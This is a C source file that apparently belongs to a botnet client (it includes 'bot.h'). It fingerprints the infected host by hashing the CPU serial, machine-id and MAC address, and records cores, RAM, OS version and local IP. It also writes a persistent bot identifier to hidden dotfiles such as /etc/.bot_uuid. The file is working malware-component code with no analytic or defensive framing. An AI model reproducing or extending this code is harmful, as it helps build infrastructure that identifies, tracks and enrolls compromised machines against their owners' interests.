#include "bot.h"

void sys_info(SysInfo *info)
{
    char raw[4096] = {0};
    FILE *ci = fopen("/proc/cpuinfo", "r");
    if (ci) {
        char line[256];
        while (fgets(line, sizeof(line), ci))
            if (strstr(line, "Serial") || strstr(line, "cpu cores")) strcat(raw, line);
        fclose(ci);
    }
    FILE *mid = fopen("/etc/machine-id", "r");
    if (mid) {
        char s[64];
        fscanf(mid, "%63s", s);
        strcat(raw, s);
        fclose(mid);
    }
    struct ifaddrs *ifa;
    if (getifaddrs(&ifa) == 0) {
        for (struct ifaddrs *p = ifa; p; p = p->ifa_next)
            if (p->ifa_addr && p->ifa_addr->sa_family == AF_INET && !(p->ifa_flags & IFF_LOOPBACK)) {
                char path[128];
                snprintf(path, sizeof(path), "/sys/class/net/%s/address", p->ifa_name);
                FILE *mf = fopen(path, "r");
                if (mf) {
                    char mac[18];
                    fscanf(mf, "%17s", mac);
                    strcat(raw, mac);
                    fclose(mf);
                }
                break;
            }
        freeifaddrs(ifa);
    }
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256((unsigned char *)raw, strlen(raw), hash);
    for (int i = 0; i < 8; i++)
        snprintf(info->hwid + i * 2, 3, "%02x", hash[i]);
    info->cpu_cores = sysconf(_SC_NPROCESSORS_ONLN);
    struct sysinfo si;
    if (sysinfo(&si) == 0) info->ram_mb = si.totalram * si.mem_unit / (1024 * 1024);
    info->net_mbps = 1000;
    FILE *osrel = fopen("/etc/os-release", "r");
    if (osrel) {
        char line[256];
        while (fgets(line, sizeof(line), osrel)) {
            if (strncmp(line, "PRETTY_NAME=", 12) != 0) continue;
            char *s = line + 12;
            if (*s == '"') s++;
            char *e = strrchr(s, '"');
            if (e) *e = 0;
            e = strchr(s, '\n');
            if (e) *e = 0;
            strncpy(info->os_ver, s, sizeof(info->os_ver) - 1);
            info->os_ver[sizeof(info->os_ver) - 1] = 0;
            break;
        }
        fclose(osrel);
    }
    if (!info->os_ver[0]) strcpy(info->os_ver, "Linux");
    /* Detect local IP via UDP socket trick */
    int tmps = socket(AF_INET, SOCK_DGRAM, 0);
    if (tmps >= 0) {
        struct sockaddr_in dst = {AF_INET, htons(53)};
        inet_pton(AF_INET, "8.8.8.8", &dst.sin_addr);
        if (connect(tmps, (struct sockaddr *)&dst, sizeof(dst)) == 0) {
            struct sockaddr_in local = {0};
            socklen_t llen = sizeof(local);
            if (getsockname(tmps, (struct sockaddr *)&local, &llen) == 0)
                inet_ntop(AF_INET, &local.sin_addr, info->ip_addr, sizeof(info->ip_addr));
        }
        close(tmps);
    }
}

void gen_uuid_v4(char *out, int cap)
{
    unsigned char b[16];
    FILE *f = fopen("/dev/urandom", "r");
    if (!f) { for (int i = 0; i < 16; i++) b[i] = (unsigned char)rand(); }
    else { fread(b, 1, 16, f); fclose(f); }
    b[6] = (b[6] & 0x0F) | 0x40;
    b[8] = (b[8] & 0x3F) | 0x80;
    snprintf(out, cap, "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
             b[0],b[1],b[2],b[3], b[4],b[5], b[6],b[7],
             b[8],b[9], b[10],b[11],b[12],b[13],b[14],b[15]);
}

static int uuid_v4_ok(const char *s)
{
    /* 8-4-4-4-12 hex with dashes; version nibble 4, variant 8/9/a/b */
    static const int dash_pos[] = {8, 13, 18, 23};
    int i, d = 0;
    if (!s || strlen(s) != 36) return 0;
    for (i = 0; i < 36; i++) {
        if (d < 4 && i == dash_pos[d]) {
            if (s[i] != '-') return 0;
            d++;
            continue;
        }
        char c = s[i];
        int hex = (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F');
        if (!hex) return 0;
    }
    if (!(s[14] >= '1' && s[14] <= '5')) return 0;
    {
        char v = s[19];
        if (!(v == '8' || v == '9' || v == 'a' || v == 'b' || v == 'A' || v == 'B'))
            return 0;
    }
    return 1;
}

void get_bot_uuid(char *out, int cap)
{
    const char *candidates[] = {"/etc/.bot_uuid", "/var/tmp/.bot_uuid", "/tmp/.bot_uuid", NULL};
    const char *idfile = NULL;
    for (int i = 0; candidates[i]; i++) {
        FILE *f = fopen(candidates[i], "r");
        if (f) {
            char tmp[64] = {0};
            if (fscanf(f, "%63s", tmp) == 1 && uuid_v4_ok(tmp)) {
                strncpy(out, tmp, (size_t)cap - 1);
                out[cap - 1] = 0;
                fclose(f);
                return;
            }
            fclose(f);
        }
        if (!idfile) {
            FILE *t = fopen(candidates[i], "a");
            if (t) { fclose(t); idfile = candidates[i]; }
        }
    }
    if (!idfile) idfile = "/tmp/.bot_uuid";
    gen_uuid_v4(out, cap);
    FILE *f = fopen(idfile, "w");
    if (f) { fprintf(f, "%s", out); fclose(f); }
}
